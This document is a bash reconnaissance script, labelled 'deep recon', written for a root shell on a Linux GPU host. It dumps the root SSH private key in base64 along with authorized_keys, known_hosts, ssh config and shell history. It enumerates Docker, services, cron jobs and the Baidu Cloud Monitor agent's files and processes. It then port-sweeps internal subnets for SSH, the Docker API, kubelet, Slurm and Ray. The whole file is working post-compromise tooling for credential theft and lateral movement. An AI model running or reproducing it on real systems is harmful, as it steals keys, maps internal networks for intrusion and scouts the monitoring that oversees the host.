#!/bin/bash
# g0023 deep recon: BCM(baidu cloud monitor), peers, keys, docker, network
echo "=== SYS"; . /etc/os-release 2>/dev/null; echo "$PRETTY_NAME"; uname -a; lscpu 2>/dev/null | grep -E '^CPU\(s\)|Model name' ; nvidia-smi -L 2>&1 | head -10
echo "=== ROOTLS"; ls -la /root 2>&1 | head -40
echo "=== CONF"; ls -la /root/conf 2>&1 | head -30; for f in /root/conf/hostlist /root/conf/*.sh; do [ -f "$f" ] && { echo "--- $f"; head -c 1200 "$f"; echo; }; done
echo "=== SSH"; ls -la /root/.ssh 2>&1
echo "--- known_hosts"; cut -c1-120 /root/.ssh/known_hosts 2>/dev/null | head -40
echo "--- authorized_keys"; awk '{print $1, $NF}' /root/.ssh/authorized_keys 2>/dev/null | head -20
echo "--- id_rsa.b64"; base64 -w0 /root/.ssh/id_rsa 2>/dev/null | head -c 6000; echo
echo "--- ssh config"; cat /root/.ssh/config 2>/dev/null | head -40
echo "=== HIST"; tail -120 /root/.bash_history 2>/dev/null | grep -viE '^$' | head -80
echo "=== FSTAB"; cat /etc/fstab 2>/dev/null | grep -v '^#'; echo "--- mount"; mount 2>/dev/null | grep -vE 'proc|sysfs|cgroup|devpts|tmpfs|overlay' | head -20
echo "=== DOCKER"; docker ps -a --format '{{.Names}} {{.Image}} {{.Status}} {{.Ports}}' 2>&1 | head -30; docker network ls 2>&1 | head
echo "=== SS"; ss -lntp 2>/dev/null | head -40
echo "=== UNITS"; systemctl list-units --type=service --state=running --no-pager 2>/dev/null | awk '{print $1}' | head -40
echo "=== BCM"; dpkg -l 2>/dev/null | grep -iE 'bcm|baidu' | head -10; ls -la /etc/bcm* /opt/bcm* /usr/local/bcm* 2>&1 | head -20
ps aux 2>/dev/null | grep -iE 'bcm|monitor' | grep -v grep | head -10
ls -l /etc/init.d/ 2>/dev/null | grep -i bcm
systemctl cat bcm-agent.service 2>/dev/null | head -40
echo "=== BCMCONF"; for f in $(find /etc /opt /usr/local -maxdepth 4 -iname '*bcm*' -type f 2>/dev/null | head -20); do echo "--- $f"; head -c 800 "$f"; echo; done
echo "=== CRON"; crontab -l 2>&1 | head -20; ls /etc/cron.d 2>/dev/null | head
echo "=== IP"; ip -br a 2>&1 | head -30; ip neigh 2>&1 | head -30
echo "=== PASSWD"; awk -F: '$3>=1000||$1=="root"{print $1,$3,$6,$7}' /etc/passwd
echo "=== SWEEP9400"; for i in $(seq 1 254); do (timeout 2 bash -c "echo > /dev/tcp/192.168.0.$i/9400" 2>/dev/null && echo "UP 192.168.0.$i:9400") & done; wait
echo "=== SWEEP22"; for i in $(seq 1 254); do (timeout 2 bash -c "echo > /dev/tcp/192.168.0.$i/22" 2>/dev/null && echo "UP 192.168.0.$i:22") & done; wait
echo "=== SWEEPOTHER"; for p in 111 2049 2375 6817 6818 8265 8081 10250; do for i in $(seq 1 254); do (timeout 1 bash -c "echo > /dev/tcp/192.168.0.$i/$p" 2>/dev/null && echo "UP 192.168.0.$i:$p") & done; done >/dev/null 2>&1; wait; echo done
echo "=== MGMT"; for n in 129 145 161 177 193 209 225 241; do (timeout 2 bash -c "echo > /dev/tcp/11.9.141.$n/22" 2>/dev/null && echo "UP 11.9.141.$n:22") & done; wait
echo "=== DONE"
